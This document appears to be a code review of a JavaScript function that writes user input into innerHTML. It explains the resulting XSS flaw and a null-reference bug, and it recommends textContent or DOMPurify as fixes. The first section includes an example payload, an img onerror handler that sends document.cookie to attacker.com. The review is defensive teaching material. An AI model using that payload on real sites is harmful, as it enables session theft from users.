### Code Review Results
---
## 1. Critical Security Vulnerability: DOM-Based Cross-Site Scripting (XSS)
This is an extremely severe, textbook security flaw, and the most dangerous problem with this code:
### What is wrong:
`innerHTML` parses and executes **all raw HTML/JavaScript** contained in the input. An attacker can supply malicious user input like:
```javascript
// Example attack payload
userInput = `<img src="fake" onerror="fetch('https://attacker.com/steal?session=' + document.cookie)">`
```

When this runs, the attacker's code executes with full permissions of your web page: they can steal user login sessions, modify page content, redirect users, perform actions impersonating the logged in user, or fully compromise the browsing session.

There is no safe way to pass unfiltered user input directly to `innerHTML`.

---
## 2. Reliability Bug
### What is wrong:
If no DOM element with id `output` exists on the page when this function runs, `getElementById` returns `null`. The function will throw an uncaught `TypeError` that will crash all subsequent script execution on the page.

---
## 3. Recommended Fixes & Improvements

### ✅ Default Fix (For 99% of real world use cases)
If you intended to display user input as **plain text** (this is almost always what developers actually want when they incorrectly use `innerHTML`), replace `innerHTML` entirely with `textContent`:
```javascript
function renderUserInput(userInput) {
  const outputElement = document.getElementById('output');

  // Graceful null guard for missing DOM elements
  if (!outputElement) {
    console.warn('Render target #output not found in DOM');
    return;
  }

  // textContent NEVER parses HTML, it eliminates XSS entirely
  outputElement.textContent = userInput;
}
```
This is completely safe for untrusted user input, and correctly renders all input exactly as written.

---
### ✅ If you actually need to render user-provided HTML
If you have a valid requirement to allow formatted HTML from users:
1.  **Never write your own HTML sanitizer**. Filtering just `<script>` tags does not work: there are hundreds of obfuscated XSS vectors that will bypass all homegrown filters.
2.  Use an audited, standard sanitization solution:
```javascript
import DOMPurify from 'dompurify'; // Battle tested open source sanitizer

function renderSafeHTML(userInput) {
  const outputElement = document.getElementById('output');
  if (!outputElement) return;

  // Always sanitize BEFORE inserting content into DOM
  outputElement.innerHTML = DOMPurify.sanitize(userInput);
}
```
For modern browsers you may also use the native browser [HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) instead of a library.

---
### Additional Best Practices:
- Do not use `innerText` as an alternative; it has broken whitespace handling and accessibility flaws. `textContent` is the W3C recommended standard for plain text insertion.
- Rendering untrusted HTML is always a high risk attack surface. Avoid this pattern entirely wherever possible.
- Add input type validation and runtime type checking for the `userInput` argument.
